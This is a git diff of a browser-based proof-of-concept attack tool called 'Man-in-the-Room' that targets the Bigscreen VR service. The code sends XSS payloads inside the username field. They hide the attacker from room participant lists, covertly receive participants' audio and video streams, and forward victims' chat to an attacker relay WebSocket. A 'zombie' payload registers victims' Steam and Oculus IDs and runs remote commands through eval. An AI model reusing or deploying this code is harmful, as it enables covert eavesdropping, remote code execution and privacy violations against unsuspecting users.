@@ -17,7 +17,11 @@
             <h1>Man-in-the-Room Attack <small class="text-muted">Proof of Concept</small></h1>
             <h2>Bigscreen <small class="text-muted"><a href="https://bigscreenvr.com/">https://bigscreenvr.com/</a></small></h2>
             <div class="alert alert-success" role="alert">
-                Attacker's username is hidden from <i>Room Preview UI</i> and from <i>Room Participants UI</i>. Attacker is not visible in VR room.
+                <p class="h3 alert-heading">Features</p>
+                <ul>
+                    <li>Attacker's username is hidden from <i>Room Preview UI</i> and from <i>Room Participants UI</i>. Attacker is not visible in VR room.</li>
+                    <li>Victim's chat is persistently eavesdropped, even if they go to another room.</li>
+                </ul>
             </div>
             <form class="form-inline" id="joinRoomForm">
                 <label class="mb-2 mr-sm-2" for="roomIdInput">Room ID: </label>
@@ -44,43 +48,192 @@
 <script>
 'use strict';
 
+const bigscreenSignalUrl = 'wss://signal2.bigscreenvr.com';
+const textName = '__Mallory__';
+const relayServer = 'ws://172.26.103.128:8081'; // TODO
+const unityVersion = '0.34.0';
 const offerOptions = {
   offerToReceiveAudio: 1,
   offerToReceiveVideo: 1
 };
+const pcConfig = {
+    'iceServers': [{
+        'urls': 'stun:stun.l.google.com:19302'
+    }]
+}; // TODO is this used?
 
-function Connection(userId, scid, pcid){
+<!--region GUI bindings -->
+const joinRoomForm = document.getElementById('joinRoomForm');
+const roomsElement = document.getElementById('rooms');
+const roomIdInput = document.getElementById('roomIdInput');
+<!--endregion-->
+
+let connections = []; // TODO remove
+let allRemoteStreams = []; // TODO remove
+let roomState; // TODO remove
+let roomUIs = {}; // TODO remove
+let rooms = [];
+let turnReady;
+let dataChannelSend, dataChannelReceive;
+
+
+/**
+ *  Connection between room participants using WebRTC.
+ */
+function Connection(userId, scid, pcid, room){
     this.userId = userId;
     this.scid = scid;
     this.pcid = pcid;
+    this.room = room;
     this.isStarted = false;
     this.isInitiator = false;
     this.rtcPeerConnection = null;
     this.remoteStream = null;
     this.videoElement = null;
     this.cardElement = null;
+
+    this.maybeStart = function () {
+        let that = this;
+        if (!that.isStarted) {
+            try {
+                that.rtcPeerConnection = new RTCPeerConnection(null);
+                that.rtcPeerConnection.onicecandidate = function (event) {
+                    console.log('icecandidate event: ', event);
+                    if (event.candidate) {
+                        that.room.sendSignalingMessage({
+                            type: 'ice',
+                            roomId: that.room.roomId,
+                            value: event.candidate.sdpMLineIndex + 'bigscreen_sdp_mline_index'
+                                + event.candidate.sdpMid + 'bigscreen_sdp_mid' + event.candidate.candidate,
+                            fromDevice: 'desktop',
+                            targetDevice: 'desktop',
+                            fromUser: that.room.attackerIdentity.userId,
+                            targetUser: that.userId,
+                            SCID: that.scid,
+                            PCID: that.pcid,
+                        });
+                    } else {
+                        console.log('End of candidates.');
+                    }
+                };
+                that.rtcPeerConnection.ontrack  = function (event) {
+                    console.log('Remote streams added.');
+                    console.log(event.streams);
+                    allRemoteStreams.push(event.streams);
+                    that.remoteStream = event.streams[0];
+                    if(that.pcid === 0){
+                        if(that.videoElement === null){
+                            let template = document.createElement('template');
+                            template.innerHTML = '<div class="col-sm-6">\n' +
+                                '           <div class="card">\n' +
+                                '               <video class="card-img-top" autoplay playsinline controls></video>\n' +
+                                '              <div class="card-body">\n' +
+                                '                <h5 class="username card-title">Username</h5>\n' +
+                                '                <h6 class="userId card-subtitle mb-2 text-muted">UserId</h6>\n' +
+                                '                <p class="card-text"></p>\n' +
+                                '              </div>\n' +
+                                '            </div>\n' +
+                                '        </div>';
+                            let cardElement = template.content.firstChild;
+                            that.cardElement = cardElement;
+                            that.videoElement = cardElement.getElementsByTagName('video')[0];
+                            roomUIs[that.room.roomId].participantsElement.appendChild(cardElement);
+                            showUsernames(that.room.roomId);
+                        }
+                        that.videoElement.srcObject = event.streams[0];
+                    }
+                };
+                that.rtcPeerConnection.onremovestream = function (event) {
+                    console.log('Remote stream removed. Event: ', event);
+                };
+
+                console.log('Created RTCPeerConnnection');
+            } catch (e) {
+                console.log('Failed to create PeerConnection, exception: ' + e.message);
+                alert('Cannot create RTCPeerConnection object.');
+                return;
+            }
+            if (that.isInitiator){
+                dataChannelSend = that.rtcPeerConnection.createDataChannel('__FOOBAR_DATA_CHANNEL_NAME_DIRECT__');
+                dataChannelSend.onopen = that.onSendChannelStateChangeDirect;
+                dataChannelSend.onclose = that.onSendChannelStateChangeDirect;
+            }
+            else{
+                that.rtcPeerConnection.ondatachannel = function(event) {
+                    console.log('Receive Channel Callback');
+                    dataChannelReceive = event.channel;
+                    dataChannelReceive.onmessage = function(event){
+                        //console.error('Received Message', connection, event.data);
+                    };
+                    dataChannelReceive.onopen = that.onReceiveChannelStateChangeDirect;
+                    dataChannelReceive.onclose = that.onReceiveChannelStateChangeDirect;
+                };
+            }
+
+            that.isStarted = true;
+            console.log('connection.isInitiator', that.isInitiator);
+            if (that.isInitiator) {
+                console.log('Sending offer to peer');
+                that.rtcPeerConnection.createOffer(offerOptions).then(
+                    function(sdp){that.setLocalAndSendMessage(sdp, that)}, that.handleCreateOfferError);
+            }
+        }
+    };
+
+    this.onSendChannelStateChangeDirect = function() {
+      const readyState = dataChannelSend.readyState;
+      console.log('dataChannelSend Send channel state is: ' + readyState);
+    };
+
+    this.onReceiveChannelStateChangeDirect = function() {
+      const readyState = dataChannelReceive.readyState;
+      console.log(`receiveDataChannelDirect Receive channel state is: ${readyState}`);
+    };
+
+    this.handleCreateOfferError = function(event) {
+        console.log('createOffer() error: ', event);
+    };
+
+    this.setLocalAndSendMessage = function(sessionDescription) {
+        this.rtcPeerConnection.setLocalDescription(sessionDescription);
+        let sessionDescriptionMessage = {
+            type: sessionDescription.type,
+            roomId: this.room.roomId,
+            value: sessionDescription.sdp,
+            fromDevice: 'desktop',
+            targetDevice: 'desktop',
+            fromUser: this.room.attackerIdentity.userId,
+            targetUser: this.userId,
+            SCID: this.scid,
+            PCID: this.pcid,
+        };
+        console.log('setLocalAndSendMessage sending message', sessionDescriptionMessage);
+        this.room.sendSignalingMessage(sessionDescriptionMessage);
+    };
+
+    this.doAnswer = function() {
+        let that = this;
+        console.log('Sending answer to peer.');
+        this.rtcPeerConnection.createAnswer().then(
+            function(sdp){that.setLocalAndSendMessage(sdp, that)},
+            that.onCreateSessionDescriptionError
+        );
+    };
+
+    this.onCreateSessionDescriptionError = function(error) {
+        console.log('Failed to create session description: ' + error.toString());
+    };
 }
-let connections = [];
 
-let allRemoteStreams = [];
-let roomState;
+function Identity(name, uuid, steamId, oculusId){
+    this.name = name;
+    this.uuid = uuid;
+    this.steamId = steamId;
+    this.oculusId = oculusId;
 
-let rooms = {};
+    this.userId = null;
+}
 
-let turnReady;
-
-let dataChannelSend, dataChannelReceive;
-
-const pcConfig = {
-    'iceServers': [{
-        'urls': 'stun:stun.l.google.com:19302'
-    }]
-};
-
-
-let textName = '__Mallory__';
-
-let relayServer = 'ws://172.26.103.128:8081'; // TODO
 //region XSS payloads
 let hideUsernameFromRoomPreview = `Array.prototype.forEach.call(document.getElementById('room-card-players').childNodes,function(e,i,a){if(e.nodeName==='#text' && e.data==='${textName}'){if(i!==0){a[i-1].remove();}}e.remove();});`;
 let hideFirstCommaFromRoomPreview = "setTimeout(function(){var n=document.getElementById('room-card-players').childNodes;if(n[0].nodeName==='SCRIPT'&&n[1].nodeName==='#text'&& n[1].data===', '){n[1].remove()}},1);";
@@ -89,7 +242,6 @@ let persistentChatEavesdropping = `;sendChat=function(){var s=new WebSocket('${r
 let makeZombie = "var sz=new WebSocket('ws://172.26.103.128:8081');sz.onopen=function(){sz.send(JSON.stringify({'type':'zombie-register','steamId':mySteamId,'oculusId':myOculusId}))};sz.onmessage=function(e){var m=JSON.parse(e.data);if(m.type==='zombie-cmd'){sz.send(JSON.stringify({type:'zombie-result','steamId':mySteamId,'oculusId':myOculusId, result:eval(m.cmd)}))}};";
 //endregion
 
-//region variables for Bigscreen signaling protocol
 let NAME = textName;
 NAME += '<scr'+'ipt>';
 NAME += hideUsernameFromRoomPreview;
@@ -99,48 +251,14 @@ NAME += persistentChatEavesdropping;
 NAME += makeZombie;
 NAME += '</sc'+'ript>';
 
-let roomId;
-let myUserId;
-let myUuid = generateBigscreenUuid();
-let unityVersion = '0.34.0';
-let mySteamId = '';
-let myOculusId = '';
-//endregion
-
-const bigscreenSignalUrl = 'wss://signal2.bigscreenvr.com';
-let websocket;
-
-
-<!--region GUI bindings -->
-const joinRoomForm = document.getElementById('joinRoomForm');
-const roomsElement = document.getElementById('rooms');
-const roomIdInput = document.getElementById('roomIdInput');
-<!--endregion-->
-
 joinRoomForm.addEventListener("submit", function (event) {
     event.preventDefault();
-    roomId = roomIdInput.value;
+    let roomId = roomIdInput.value;
 
-    websocket = new WebSocket(bigscreenSignalUrl);
-    websocket.binaryType = 'arraybuffer';
-    websocket.onopen = function (event) {
-        console.log('connected', event);
-        sendMessage({type: 'register-desktop'});
-        console.log('registered');
-        joinRoom();
-        let roomUI = new RoomCardUI(roomId);
-        roomUI.render(roomsElement);
-        rooms[roomId] = roomUI;
-    };
-    websocket.onclose = function (event) {
-        console.log('onClose disconnected', event);
-    };
-    websocket.onmessage = function (event) {
-        onMessage(event);
-    };
-    websocket.onerror = function (event) {
-        console.log('onError event', event);
-    };
+    let attackerIdentity = new Identity(NAME, generateBigscreenUuid(), '', '');
+    let room = new Room(roomId, attackerIdentity);
+    rooms.push(room);
+    room.join();
 });
 
 function RoomCardUI(roomId){
@@ -150,14 +268,14 @@ function RoomCardUI(roomId){
         '    <div class="card-header"></div>\n' +
         '    <div class="card-body">\n' +
         '        <div class="row">\n' +
-        '            <div class="col-sm-3">\n' +
+        '            <div class="col-6 col-sm-4">\n' +
         '                <div class="card">\n' +
         '                    <div class="card-header">Chat</div>\n' +
         '                    <div class="card-body chat">\n' +
         '                    </div>\n' +
         '                </div>\n' +
         '            </div>\n' +
-        '            <div class="col-sm-9">\n' +
+        '            <div class="col-6 col-sm-8">\n' +
         '                <div class="row"></div>\n' +
         '            </div>\n' +
         '      </div>\n' +
@@ -192,13 +310,215 @@ function RoomCardUI(roomId){
     }
 }
 
+/**
+ * Room with connection to signalling server and participants.
+ */
+function Room(roomId, attackerIdentity){
+    this.attackerIdentity = attackerIdentity;
 
+    this.roomId = roomId;
+    this.name = null;
+    this.description = null;
+    this.private = null;
+    this.size = null;
+    this.createdName = null;
+    this.createdTime = null;
+    this.roomType = null;
+    this.category = null;
+    this.environment = null;
+    this.version = null;
+
+    this.lastUpdated = null;
+    // `this.update()` is called at the end of this constructor
+
+    this.signalingWs = null;
+
+    this.roomUI = null;
+    this.connections = [];
+
+    /**
+     * Asynchronously update room information.
+     */
+    this.update = function(){
+        let that = this;
+        let xhr = new XMLHttpRequest();
+        xhr.overrideMimeType("application/json");
+        xhr.onload = function() {
+                roomState = JSON.parse(xhr.responseText);
+
+                that.name = roomState.name;
+                that.description = roomState.description;
+                that.private = roomState.private;
+                that.size = roomState.size;
+                that.createdName = roomState['created.name'];
+                that.createdTime = roomState['created.time'];
+                that.roomType = roomState.roomType;
+                that.category = roomState.category;
+                that.environment = roomState.environment;
+                that.version = roomState.version;
+
+                that.lastUpdated = new Date();
+        };
+        xhr.onerror = function(){
+            console.error('ERROR', 'Room.update()', xhr, that);
+        };
+        xhr.open('GET', 'https://signal2adm.bigscreenvr.com/roomstate?roomId='+this.roomId, true);
+        xhr.send();
+    };
+
+    this.sendSignalingMessage = function(message) {
+        console.log('sendSignalingMessage', message);
+        this.signalingWs.send(msgpack.encode(message));
+    };
+
+    /**
+     * Join room. Connect to signaling server and establish WebRTC channels
+     * with other room participants.
+     */
+    this.join = function(){
+        let that = this;
+        this.signalingWs = new WebSocket(bigscreenSignalUrl);
+        this.signalingWs.binaryType = 'arraybuffer';
+        this.signalingWs.onopen = function (event) {
+            console.log('connected', event);
+            that.sendSignalingMessage({type: 'register-desktop'});
+            console.log('registered');
+
+            that.sendSignalingMessage({
+                'type': "room-join",
+                'roomId': that.roomId,
+                'name': that.attackerIdentity.name,
+                'uuid': that.attackerIdentity.uuid,
+                'version': unityVersion,
+                'steamId': that.attackerIdentity.steamId,
+                'oculusId': that.attackerIdentity.oculusId
+            });
+
+            let roomUI = new RoomCardUI(roomId);
+            roomUI.render(roomsElement);
+            roomUIs[roomId] = roomUI; // todo remove
+            that.roomUI = roomUI;
+        };
+        this.signalingWs.onclose = function (event) {
+            console.log('onClose disconnected', event);
+        };
+        this.signalingWs.onmessage = function (event) {
+            that.onSignalingMessage(event);
+        };
+        this.signalingWs.onerror = function (event) {
+            console.log('onError event', event);
+        };
+    };
+
+    this.onSignalingMessage = function(event) {
+        let message = msgpack.decode(new Uint8Array(event.data));
+        console.log('Room.onSignalingMessage()', message);
+
+        switch (message.type) {
+            case "room-latest":
+            case "admin":
+            case "linkedpc-joined":
+            case "linkedpc-left":
+            case "party-join":
+            case "user-ready":
+            case "user-left":
+            case "room-join-fail":
+            case "room-created":
+            case "room-environment":
+            case "room-private":
+            case "room-public":
+            case "events":
+            case "server-time":
+                console.log('received message ignored', message);
+                break;
+
+            case "user-joined":
+                if(message.uuid === this.attackerIdentity.uuid){
+                    this.attackerIdentity.userId = message.userId;
+                    console.log('set attackerIdentity.userId', this.attackerIdentity.userId);
+                    console.log('user ready');
+
+                    this.sendSignalingMessage({
+                        type: "user-ready",
+                        roomId: this.roomId,
+                        userId: this.attackerIdentity.userId
+                    });
+                }
+                break;
+
+            case 'ice':
+                console.log('onMessage received ICE');
+                console.assert(message.fromDevice === 'desktop', message.fromDevice);
+
+                const candidateStartPos = message.value.indexOf('candidate:');
+                let beforeCandidate  = message.value.slice(0,candidateStartPos);
+                let sdpMLineIndex = beforeCandidate.slice(0, beforeCandidate.indexOf('bigscreen_sdp_mline_index'));
+                let sdpMid = beforeCandidate.slice(
+                    beforeCandidate.indexOf('bigscreen_sdp_mline_index') + 'bigscreen_sdp_mline_index'.length,
+                    beforeCandidate.indexOf('bigscreen_sdp_mid'));
+                let candidate = new RTCIceCandidate({
+                    sdpMid: sdpMid,
+                    sdpMLineIndex: sdpMLineIndex,
+                    candidate: message.value.slice(candidateStartPos)
+                });
+                {
+                    let connection = this.connections.find(function(c){return c.userId === message.fromUser && c.pcid === message.PCID});
+                    console.log('ice conn', connection);
+                    connection.rtcPeerConnection.addIceCandidate(candidate);
+                }
+                break;
+            case 'offer':
+                console.log('onMessage received OFFER');
+                console.assert(message.fromDevice === 'desktop', message.fromDevice);
+
+                {
+                    let connection = new Connection(message.fromUser, message.SCID, message.PCID, this);
+                    this.connections.push(connection);
+                    connections.push(connection); // TODO remove
+
+                    if (!connection.isInitiator && !connection.isStarted) {
+                        connection.maybeStart();
+                    }
+                    connection.rtcPeerConnection.setRemoteDescription(new RTCSessionDescription(
+                        {type: message.type, sdp: message.value, SCID: connection.scid, pcid: connection.pcid}));
+                    connection.doAnswer();
+                }
+                break;
+            case 'answer':
+                console.error('onMessage received ANSWER');
+
+                console.assert(message.roomId === this.roomId, message.roomId, this.roomId);
+                console.assert(message.targetUser === this.attackerIdentity.userId, message.targetUser, this.attackerIdentity.userId);
+                console.assert(message.fromDevice === 'desktop', message.fromDevice);
+                console.assert(message.targetDevice === 'desktop', message.targetDevice);
+                {
+                    let connection = this.connections.find(function(c){return c.userId === message.fromUser && c.pcid === message.PCID});
+                    if (connection.isStarted) {
+                        connection.setRemoteDescription(new RTCSessionDescription(
+                            {
+                                type: message.type,
+                                sdp: message.value,
+                                scid: connection.scid,
+                                pcid: connection.pcid
+                            }));
+                    }
+                }
+                break;
+            default:
+                console.error('Unexpected message type (server to client):', message);
+                break;
+        }
+    };
+
+    this.update();
+}
 
 
 ////////////////////////////////////////////////
 
-function showUsernames() {
+function showUsernames(roomId) {
     var xhttp = new XMLHttpRequest();
+    xhttp.overrideMimeType("application/json");
     xhttp.onreadystatechange = function() {
         console.log('onreadystatechange', this.readyState);
         if (this.readyState === 4 && this.status === 200) {
@@ -222,267 +542,11 @@ function showUsernames() {
     xhttp.send();
 }
 
-function sendMessage(message) {
-    console.log('sendMessage', message);
-    websocket.send(msgpack.encode(message));
-}
-
-function onMessage(event) {
-    let message = msgpack.decode(new Uint8Array(event.data));
-    console.log('onMessage', message);
-
-    switch (message.type) {
-        case "room-latest":
-        case "admin":
-        case "linkedpc-joined":
-        case "linkedpc-left":
-        case "party-join":
-        case "user-ready":
-        case "user-left":
-        case "room-join-fail":
-        case "room-created":
-        case "room-environment":
-        case "room-private":
-        case "room-public":
-        case "events":
-        case "server-time":
-            console.log('received message ignored', message);
-            break;
-
-        case "user-joined":
-            if(message.uuid === myUuid){
-                myUserId = message.userId;
-                console.log('set myUserId', myUserId);
-                sendUserReady();
-                console.log('user ready');
-            }
-            break;
-
-        case 'ice':
-            console.log('onMessage received ICE');
-            console.assert(message.fromDevice === 'desktop', message.fromDevice);
-
-            const candidateStartPos = message.value.indexOf('candidate:');
-            let beforeCandidate  = message.value.slice(0,candidateStartPos);
-            let sdpMLineIndex = beforeCandidate.slice(0, beforeCandidate.indexOf('bigscreen_sdp_mline_index'));
-            let sdpMid = beforeCandidate.slice(
-                beforeCandidate.indexOf('bigscreen_sdp_mline_index') + 'bigscreen_sdp_mline_index'.length,
-                beforeCandidate.indexOf('bigscreen_sdp_mid'));
-            let candidate = new RTCIceCandidate({
-                sdpMid: sdpMid,
-                sdpMLineIndex: sdpMLineIndex,
-                candidate: message.value.slice(candidateStartPos)
-            });
-            {
-                let connection = connections.find(function(c){return c.userId === message.fromUser && c.pcid === message.PCID});
-                console.log('ice conn', connection);
-                connection.rtcPeerConnection.addIceCandidate(candidate);
-            }
-            break;
-        case 'offer':
-            console.log('onMessage received OFFER');
-            console.assert(message.fromDevice === 'desktop', message.fromDevice);
-
-            {
-                let connection = new Connection(message.fromUser, message.SCID, message.PCID);
-                connections.push(connection);
-
-                if (!connection.isInitiator && !connection.isStarted) {
-                    maybeStart(connection);
-                }
-                connection.rtcPeerConnection.setRemoteDescription(new RTCSessionDescription(
-                    {type: message.type, sdp: message.value, SCID: connection.scid, pcid: connection.pcid}));
-                doAnswer(connection);
-            }
-            break;
-        case 'answer':
-            console.error('onMessage received ANSWER');
-
-            console.assert(message.roomId === roomId, message.roomId, roomId);
-            console.assert(message.targetUser === myUserId, message.targetUser, myUserId);
-            console.assert(message.fromDevice === 'desktop', message.fromDevice);
-            console.assert(message.targetDevice === 'desktop', message.targetDevice);
-            {
-                let connection = connections.find(function(c){return c.userId === message.fromUser && c.pcid === message.PCID});
-                if (connection.isStarted) {
-                    connection.setRemoteDescription(new RTCSessionDescription(
-                        {
-                            type: message.type,
-                            sdp: message.value,
-                            scid: connection.scid,
-                            pcid: connection.pcid
-                        }));
-                }
-            }
-            break;
-        default:
-            console.error('Unexpected message type (server to client):', message);
-            break;
-    }
-}
-
 function generateBigscreenUuid() {
   function bigscreenRand() {
     return Math["floor"]((1 + Math["random"]()) * 65536).toString(16) ["substring"](1)
   }
   return bigscreenRand() + bigscreenRand() + "-" + bigscreenRand() + "-" + bigscreenRand() + "-" + bigscreenRand() + "-" + bigscreenRand() + bigscreenRand() + bigscreenRand()
-}
-
-function joinRoom(){
-    sendMessage({
-        'type': "room-join",
-        'roomId': roomId,
-        'name': NAME,
-        'uuid': myUuid,
-        'version': unityVersion,
-        'steamId': mySteamId,
-        'oculusId': myOculusId
-    });
-}
-
-function sendUserReady(){
-    sendMessage({
-        type: "user-ready",
-        roomId: roomId,
-        userId: myUserId
-    })
-}
-////////////////////////////////////////////////////
-
-
-
-function maybeStart(connection) {
-    if (!connection.isStarted) {
-        try {
-            connection.rtcPeerConnection = new RTCPeerConnection(null);
-            connection.rtcPeerConnection.onicecandidate = function (event) {
-                console.log('icecandidate event: ', event);
-                if (event.candidate) {
-                    sendMessage({
-                        type: 'ice',
-                        roomId: roomId,
-                        value: event.candidate.sdpMLineIndex + 'bigscreen_sdp_mline_index'
-                            + event.candidate.sdpMid + 'bigscreen_sdp_mid' + event.candidate.candidate,
-                        fromDevice: 'desktop',
-                        targetDevice: 'desktop',
-                        fromUser: myUserId,
-                        targetUser: connection.userId,
-                        SCID: connection.scid,
-                        PCID: connection.pcid,
-                    });
-                } else {
-                    console.log('End of candidates.');
-                }
-            };
-            connection.rtcPeerConnection.ontrack  = function (event) {
-                console.log('Remote streams added.');
-                console.log(event.streams);
-                allRemoteStreams.push(event.streams);
-                connection.remoteStream = event.streams[0];
-                if(connection.pcid === 0){
-                    if(connection.videoElement === null){
-                        let template = document.createElement('template');
-                        template.innerHTML = '<div class="col-sm-4">\n' +
-                            '           <div class="card">\n' +
-                            '               <video class="card-img-top" autoplay playsinline controls></video>\n' +
-                            '              <div class="card-body">\n' +
-                            '                <h5 class="username card-title">Username</h5>\n' +
-                            '                <h6 class="userId card-subtitle mb-2 text-muted">UserId</h6>\n' +
-                            '                <p class="card-text"></p>\n' +
-                            '              </div>\n' +
-                            '            </div>\n' +
-                            '        </div>';
-                        let cardElement = template.content.firstChild;
-                        connection.cardElement = cardElement;
-                        connection.videoElement = cardElement.getElementsByTagName('video')[0];
-                        rooms[roomId].participantsElement.appendChild(cardElement);
-                        showUsernames();
-                    }
-                    connection.videoElement.srcObject = event.streams[0];
-                }
-            };
-            connection.rtcPeerConnection.onremovestream = function (event) {
-                console.log('Remote stream removed. Event: ', event);
-            };
-
-            console.log('Created RTCPeerConnnection');
-        } catch (e) {
-            console.log('Failed to create PeerConnection, exception: ' + e.message);
-            alert('Cannot create RTCPeerConnection object.');
-            return;
-        }
-        if (connection.isInitiator){
-            dataChannelSend = connection.rtcPeerConnection.createDataChannel('__FOOBAR_DATA_CHANNEL_NAME_DIRECT__');
-            dataChannelSend.onopen = onSendChannelStateChangeDirect;
-            dataChannelSend.onclose = onSendChannelStateChangeDirect;
-        }
-        else{
-            connection.rtcPeerConnection.ondatachannel = function(event) {
-                console.log('Receive Channel Callback');
-                dataChannelReceive = event.channel;
-                dataChannelReceive.onmessage = function(event){
-                    //console.error('Received Message', connection, event.data);
-                };
-                dataChannelReceive.onopen = onReceiveChannelStateChangeDirect;
-                dataChannelReceive.onclose = onReceiveChannelStateChangeDirect;
-            };
-        }
-
-        connection.isStarted = true;
-        console.log('connection.isInitiator', connection.isInitiator);
-        if (connection.isInitiator) {
-            console.log('Sending offer to peer');
-            connection.rtcPeerConnection.createOffer(offerOptions).then(
-                function(sdp){setLocalAndSendMessage(sdp, connection)}, handleCreateOfferError);
-        }
-    }
-}
-
-function onSendChannelStateChangeDirect() {
-  const readyState = dataChannelSend.readyState;
-  console.log('dataChannelSend Send channel state is: ' + readyState);
-}
-function onReceiveChannelStateChangeDirect() {
-  const readyState = dataChannelReceive.readyState;
-  console.log(`receiveDataChannelDirect Receive channel state is: ${readyState}`);
-}
-
-/////////////////////////////////////////////////////////
-
-
-
-
-function handleCreateOfferError(event) {
-    console.log('createOffer() error: ', event);
-}
-
-function setLocalAndSendMessage(sessionDescription, connection) {
-    connection.rtcPeerConnection.setLocalDescription(sessionDescription);
-    let sessionDescriptionMessage = {
-        type: sessionDescription.type,
-        roomId: roomId,
-        value: sessionDescription.sdp,
-        fromDevice: 'desktop',
-        targetDevice: 'desktop',
-        fromUser: myUserId,
-        targetUser: connection.userId,
-        SCID: connection.scid,
-        PCID: connection.pcid,
-    };
-    console.log('setLocalAndSendMessage sending message', sessionDescriptionMessage);
-    sendMessage(sessionDescriptionMessage);
-}
-
-function doAnswer(connection) {
-    console.log('Sending answer to peer.');
-    connection.rtcPeerConnection.createAnswer().then(
-        function(sdp){setLocalAndSendMessage(sdp, connection)},
-        onCreateSessionDescriptionError
-    );
-}
-
-function onCreateSessionDescriptionError(error) {
-    console.log('Failed to create session description: ' + error.toString());
 }
 
 /*
@@ -534,7 +598,7 @@ messageRelayWs.onmessage = function(event){
     console.log("messageRelayWs received:", message);
     switch (message.type) {
         case 'chat':
-            rooms[message.roomId].renderChatMessage(message.message, message.name, new Date());
+            roomUIs[message.roomId].renderChatMessage(message.message, message.name, new Date());
             break;
         case 'zombie-register': {
             let zombieId = message.steamId + '_' + message.oculusId;
